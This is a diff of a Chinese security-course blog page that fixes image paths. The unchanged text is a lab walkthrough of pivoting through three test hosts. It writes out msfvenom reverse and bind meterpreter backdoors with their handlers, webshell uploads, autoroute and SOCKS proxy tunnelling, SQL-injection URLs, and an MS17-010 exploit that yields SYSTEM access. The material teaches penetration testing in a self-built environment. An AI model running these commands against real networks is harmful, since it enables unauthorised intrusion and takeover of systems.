+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-25.png" alt="70-1"></p>
 <p>&lt;5&gt;浏览器查看一下，写入成功</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-26.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-26.png" alt="70-1"></p>
 <p>&lt;6&gt;蚁剑连接，拿到第1个flag。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-27.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-27.png" alt="70-1"></p>
 <p>连接上去之后，可以用它当做跳板，但是蚁剑比较麻烦，此时可以改用CS神器或者MSF，因为使用CS或者MSF时，即使权限不够，我们也可以进行一些操作。</p>
 <p>&lt;7&gt;接下来我们开始渗透Target2。kali直接与target2连接是连不上的。因为kali网段是76，target2网段是22，二者不在同一个网段，无法互联，但是target1网段是76和22，target1既跟kali同一网段，又跟target2同一网段，因此，我们可以将target1作为跳板，实现kali和target2的互联。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-28.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-28.png" alt="70-1"></p>
 <p>&lt;8&gt;生成后门（kali上）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.76.132 LPORT=1111 -f elf &gt;t1.elf</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-29.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-29.png" alt="70-1"></p>
 <p>&lt;9&gt;设置监听，准备接受反弹（kali上）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.76.132</span><br><span class="line">set LPORT 1111</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-30.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-30.png" alt="70-1"></p>
 <p>&lt;10&gt;将生成的后门通过蚁剑webshell上传到target1主机，执行后门。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-31.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-31.png" alt="70-1"></p>
 <p>&lt;11&gt;此时kali上接收到会话，getuid可以查看会话权限。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-32.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-32.png" alt="70-1"></p>
 <p>&lt;12&gt;信息收集及配置访问。</p>
 <p>由于测试环境是我们自己准备的，所以我们知道target2主机的网段及IP地址。但是在实战中，我们应该是未知的，因此我们需要首先进行信息收集，以获得目标target2的相关信息，为进一步的渗透做准备。</p>
 <p>首先，获取网络接口：run get_local_subnets ，由结果我们得知，target1存在两个网络接口，一个76，一个22，76与kali同一网段，是连接外网的，那22就是连接内网（局域网）的。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-33.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-33.png" alt="70-1"></p>
 <p>然后，查看路由地址：run autoroute -p ，发现当前的路由地址是空的</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-34.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-34.png" alt="70-1"></p>
 <p>接着，我们就要添加路由地址：run autoroute -s 192.168.22.0&#x2F;24</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-35.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-35.png" alt="70-1"></p>
 <p>最后，再查看一下路由地址，确认添加成功。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-36.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-36.png" alt="70-1"></p>
 <p>添加路由地址成功，说明在刚才反弹的session1会话上，我们添加了一个22网段的网络接口。此时我们就可以通过这个路由跟22网段进行通讯了。虽然能够通讯了，但是我们的目标是攻击target2，要攻击就需要使用到工具，由于路由是写到了maf建立的会话上面，有些工具没法用。此时我们就需要开一个代理，开这个代理就相当于开一个接口给其他人用。<br>&lt;13&gt;开启本地代理</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 2222</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-37.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-37.png" alt="70-1"></p>
 <p>&lt;14&gt;利用本地代理接口访问测试</p>
 <p>首先，kali上配置proxychains（代理工具），修改&#x2F;etc&#x2F;proxychains.conf配置文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 192.168.76.132 2222（在配置文件中添加）</span><br></pre></td></tr></table></figure>
@@ -324,58 +324,58 @@
 <p>然后，调用工具探针Target2，扫描结果发现，80端口开放。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80</span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-38.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-38.png" alt="70-1"></p>
 <p>接着，浏览器修改代理配置</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-39.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-39.png" alt="70-1"></p>
 <p>最后，此时kali上我们就可以正常访问target2上的服务了（以前是无法连接状态）</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-40.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-40.png" alt="70-1"></p>
 <p>Target2（ubuntu x64）：</p>
 <p>探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3</p>
 <p>&lt;1&gt;探针目标，利用SQL注入，拿到后台密码，登录后台。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.128/index.php?r=vul&amp;keyword=1 #sql注入</span><br><span class="line">http://192.168.22.128/index.php?r=admini/public/login #后台</span><br><span class="line">http://192.168.22.128/index.php?r=special #后门shell</span><br></pre></td></tr></table></figure>
 
 <p>首先探针目标，在源码中直接找到线索，target2上的CMS服务存在SQL注入漏洞。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-41.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-41.png" alt="70-1"></p>
 <p>然后，通过sqlmap扫描注入点找到用户名密码。</p>
 <p>接着，通过robots.txt文件找到了后台地址。\</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-42.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-42.png" alt="70-1"></p>
 <p>最后，使用用户名密码登录后台。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-43.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-43.png" alt="70-1"></p>
 <p>登录成功，拿到第2个flag。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-44.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-44.png" alt="70-1"></p>
 <p>&lt;2&gt;通过后台模板功能，写入后门。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-45.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-45.png" alt="70-1"></p>
 <p>&lt;3&gt;配置蚁剑代理，测试连接，保存连接，访问，拿到webshell。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-46.png" alt="70-1"></p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-47.png" alt="70-1"></p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-48.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-46.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-47.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-48.png" alt="70-1"></p>
 <p>以上是kali linux的代理访问设置，如果攻击机是windows的话，还可以利用代理工具Proxifier或SocksCap64载入代理进行远程访问测试。</p>
 <p>Proxifier全局代理：</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-49.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-49.png" alt="70-1"></p>
 <p>SocksCap64代理：</p>
 <p>首先，点击代理，配置代理地址、端口和代理类型。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-50.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-50.png" alt="70-1"></p>
 <p>然后，点击程序，选择需要使用该代理的程序。（比如某些程序本身没有代理配置，此时就可以与SocksCap64配合使用代理）</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-51.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-51.png" alt="70-1"></p>
 <p>最后，右击添加的程序，选择”在代理隧道中运行选中程序”。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-52.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-52.png" alt="70-1"></p>
 <p>&lt;4&gt;生成正向后门</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-53.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-53.png" alt="70-1"></p>
 <p>&lt;5&gt;访问接收</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.128</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-54.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-54.png" alt="70-1"></p>
 <p>&lt;6&gt;将后门通过webshell上传，执行</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-55.png" alt="70-1"></p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-56.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-55.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-56.png" alt="70-1"></p>
 <p>&lt;7&gt;接收到会话</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-57.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-57.png" alt="70-1"></p>
 <p>&lt;8&gt;信息收集及配置访问</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-58.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-58.png" alt="70-1"></p>
 <p>接下来对3333端口进行攻击，由于目标主机是windows系统，我们以前讲过很多攻击工具，比如，namp –script&#x3D;all、namp –script&#x3D;vuln、nessus等。</p>
 <p>Target3:（windows7 x64）</p>
 <p>探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GG</p>
@@ -386,9 +386,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>&lt;3&gt;监听到会话，得到system权限。</p>
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-59.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-59.png" alt="70-1"></p>
 <p>&lt;4&gt;搜索关键字，得到第3个flag。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">dir /S flag.txt /B</span><br><span class="line">type xxxxx.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C70-60.png" alt="70-1"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-60.png" alt="70-1"></p>
 </article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/">HVVL404</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/2023/04/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/70-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">http://blog.hvvl404.fun/2023/04/28/小迪安全/小迪安全（内网篇）/70-内网安全-域横向内网漫游Socks代理隧道技术/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.hvvl404.fun" target="_blank">HVVL404</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a 